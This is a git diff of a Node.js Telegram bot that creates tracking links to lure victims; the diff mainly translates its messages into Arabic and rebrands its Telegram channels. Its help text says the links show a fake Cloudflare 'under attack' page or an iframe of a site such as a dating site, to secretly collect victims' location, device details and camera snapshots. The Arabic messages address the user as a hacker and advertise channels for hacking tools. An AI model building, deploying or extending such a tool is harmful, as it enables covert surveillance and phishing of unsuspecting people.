@@ -1,3 +1,4 @@
+const mySecret = process.env['bot']
 const fs = require("fs");
 const express = require("express");
 var cors = require('cors');
@@ -14,7 +15,7 @@ app.use(cors());
 app.set("view engine", "ejs");
 
 //Modify your URL here
-var hostURL="YOUR URL";
+var hostURL="Link";
 //TOGGLE for 1pt Proxy and Shorters
 var use1pt=true;
 
@@ -30,7 +31,7 @@ if(req.params.path != null){
 res.render("webview",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("https://t.me/name_dark");
+res.redirect("https://t.me/Driving_uncle_personally");
 }
 
          
@@ -48,7 +49,7 @@ if(req.params.path != null){
 res.render("cloudflare",{ip:ip,time:d,url:atob(req.params.uri),uid:req.params.path,a:hostURL,t:use1pt});
 } 
 else{
-res.redirect("https://t.me/name_dark");
+res.redirect("https://t.me/Driving_uncle_personally");
 }
 
          
@@ -71,28 +72,56 @@ var m={
 reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}]]})
 };
 
-bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \n
-يمكنك استخدام هذا الروبوت لتعقب الأشخاص فقط في خلال رابط بسيط. يمكنه جمع معلومات مثل الموقع ومعلومات الجهاز ولقطات الكاميرا 
- 
- يجب عليك الانضام من القناه حتي لا تواجه مشاكل
-
-https://t.me/name_dark
-	
-				
-\n\nType /help for more info.`,m);
+bot.sendMessage(chatId, `مرحباً عزيزي الهكر ${msg.chat.first_name} ! , \nيمكنك استخدام هذا البوت لتعقب الأشخاص فقط من خلال رابط بسيط.
+يمكنه جمع معلومات مثل الموقع ومعلومات الجهاز ولقطات الكاميرا 
+مطور ومبرمج بحتراف من قبل القياده الخال شخصياً 🦅🇾🇪
+اذا وقف معك البوت تواصل مع المطور ☟
+@TheYemenigentle 
+----------------------------------------------------------------
+ملاحظه ⚠️
+للمزيد من المساعده ارسل كلمة /help.
+الحقوق محفوظه لدى قناة @Termux7.`,m);
 }
 else if(msg.text=="/create"){
 createNew(chatId);
 }
 else if(msg.text=="/help"){
-bot.sendMessage(chatId,` Through this bot you can track people just by sending a simple link.\n\nSend /create
-to begin , afterwards it will ask you for a URL which will be used in iframe to lure victims.\nAfter receiving
-the url it will send you 2 links which you can use to track people.
-\n\nSpecifications.
-\n1. Cloudflare Link: This method will show a cloudflare under attack page to gather informations and afterwards victim will be redirected to destinationed URL.
-\n2. Webview Link: This will show a website (ex bing , dating sites etc) using iframe for gathering information.
-( ⚠️ Many sites may not work under this method if they have x-frame header present.Ex https://google.com )
-\n\nThe project is OSS at: https://github.com/MR-DARK54
+bot.sendMessage(chatId,` مرحباً عزيزي الهكر 
+برمجة اخلاقيه وقانونيه 
+لا تستخدم البوت فيما يغضب الله
+مثل ما ستوقع غيرك اعرف انك ستقع انت بنفسك
+لا تحاول اسقاط الجميع لتسقط
+البوت يعمل بذكاء خارق ✅
+مطور من قبل القياده الخال شخصياً 🦅🇾🇪
+
+من خلال هذا البوت ، يمكنك تتبع الأشخاص فقط عن طريق إرسال رابط بسيط.
+
+إرسل /create
+للبدء ، سيطلب منك بعد ذلك عنوان URL الذي سيتم استخدامه في iframe لجذب الضحايا.
+بعد الاستلام
+عنوان url سيرسل لك رابطين يمكنك استخدامهما لتتبع الأشخاص.
+
+
+تحديد.
+
+1. ارتباط Cloudflare: ستُظهر هذه الطريقة صفحة Cloudflare تحت الهجوم لجمع المعلومات وبعد ذلك سيتم إعادة توجيه الضحية إلى عنوان URL المقصود.
+
+2. رابط عرض الويب: سيعرض هذا موقع الويب (مثل bing ومواقع المواعدة وما إلى ذلك) باستخدام iframe لجمع المعلومات.
+(⚠️ قد لا تعمل العديد من المواقع بموجب هذه الطريقة إذا كان لديها رأس إطار x موجود. مثال https://google.com)
+
+تم برجمة البوت من الغه الانجليزيه الى الغه العربيه بواسطة القياده الخال شخصياً
+معرف قناة المطور الرسميه 
+@Driving_uncle_personally
+@Driving_uncle_personally )
+
+
+الحقوق محفوظه لدى قناة المطور: 
+@Driving_uncle_personally
+سيتم تنزيل اهم ادوات الاختراق الاكثر خطوره 
+على قناة اخوي العراقي 
+رابط القناه 
+@Termux7
+@Termux7
 `);
 }
   
@@ -145,7 +174,7 @@ for(var c in y){
 g+=y[c]+"\n";
 }
   
-bot.sendMessage(cid, `New links has been created successfully.You can use any one of the below links.\nURL: ${msg}\n\n✅Your Links\n\n🌐 CloudFlare Page Link\n${f}\n\n🌐 WebView Page Link\n${g}`,m);
+bot.sendMessage(cid, `تم صنع الروابط من قبل بوت الاختراق ☠ من خلال الرابط الخاص بك الذي ارسلته للبوت ☠ مطور البوت القياده الخال شخصياً🦅🇾🇪.\nالرابط الخاص بك الذي كتبته: ${msg}\n\n✅تم صنع الروابط من قبل بوت الخال\n\n🌐 اول ثلاثه روابط تم صنعهم من قبل بوت القياده الخال 👇 \n${f}\n\n🌐 ثاني ثلاثه روابط الذي تم صنعهم من قبل بوت القياده الخال 👇\n${g}`,m);
 }
 else{
 
@@ -153,7 +182,10 @@ bot.sendMessage(cid, `New links has been created successfully.\nURL: ${msg}\n\n�
 }
 }
 else{
-bot.sendMessage(cid,`⚠️ Please Enter a valid URL , including http or https.`);
+bot.sendMessage(cid,`⚠️ الرابط غلط❌ عيد كتابة الرابط بشكل صحيح كمثال اول شي اكتب هيك 👇
+https:// بعد كتابة هذا اكتب اي احرف انجليزي لصنع رابط خاص بك
+الحقوق محفوظه لدى قناة مطور البوت 👇
+@Driving_uncle_personally.`);
 createNew(cid);
 
 }  
@@ -247,3 +279,4 @@ res.send("Done");
 app.listen(5000, () => {
 console.log("App Running on Port 5000!");
 });
+db.list("prefix").then(matches => {})
